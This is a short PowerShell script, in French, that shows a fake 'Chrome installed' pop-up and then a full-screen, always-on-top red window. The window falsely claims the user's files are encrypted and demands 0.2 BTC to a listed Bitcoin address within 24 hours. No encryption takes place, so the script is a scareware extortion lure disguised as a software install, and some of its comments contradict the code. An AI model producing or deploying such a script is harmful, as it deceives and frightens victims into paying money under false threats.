Add-Type -AssemblyName PresentationFramework

# Récupérer la taille de l'écran
$screenWidth = [System.Windows.SystemParameters]::PrimaryScreenWidth
$screenHeight = [System.Windows.SystemParameters]::PrimaryScreenHeight

# Premier pop-up classique
[System.Windows.MessageBox]::Show('Installation de Chrome... TERMINE', 'Information', 'OK', 'Information')

# Deuxième fenêtre WPF pour avertissement critique
$warningWindow = New-Object Windows.Window
$warningWindow.Title = 'AVERTISSEMENT CRITIQUE'
$warningWindow.Content = "TOUS VOS FICHIERS SONT CHIFFRES !`n`n" +
                         "Envoie-moi 0.2 BTC pour obtenir la cle de dechiffrement.`n`n" +
                         "Mon adresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A.`n`n" +
                         "DELAI RESTANT : 24 HEURES SOUS PEINE DE PERDRE.`n`n" + 
                         "                VOS FICHIERS DEFINITIVEMENT"
$warningWindow.FontSize = 32
# Adapter la taille de la fenêtre en fonction de la taille de l'écran
$warningWindow.Width = $screenWidth  # 70% de la largeur de l'écran
$warningWindow.Height = $screenHeight # 50% de la hauteur de l'écran
$warningWindow.Left = ($screenWidth - $warningWindow.Width) / 2
$warningWindow.Top = ($screenHeight - $warningWindow.Height) / 2
$warningWindow.Topmost = $true
$warningWindow.Background = 'Red'
$warningWindow.Foreground = 'White'
$warningWindow.ShowDialog()
